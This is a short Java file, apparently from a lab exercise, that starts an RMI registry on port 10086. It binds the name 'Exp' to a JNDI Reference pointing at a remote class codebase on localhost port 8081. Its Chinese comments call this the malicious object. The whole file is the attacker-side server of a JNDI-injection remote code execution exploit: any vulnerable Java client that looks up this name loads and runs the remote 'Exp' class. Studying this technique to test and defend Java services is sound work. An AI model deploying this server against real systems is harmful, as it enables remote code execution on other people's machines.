package jmdi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServerTest {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        //标识符
        String jndi_uri = "http://127.0.0.1:8081/";
        //注册中心
        Registry registry = LocateRegistry.createRegistry(10086);
        //标识符与与恶意对象关联
        Reference reference = new Reference("Exp", "Exp", jndi_uri);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        //将名称与恶意对象实体进行绑定注册
        registry.bind("Exp",referenceWrapper);
        System.out.println("RMI服务端已启动......");
    }
}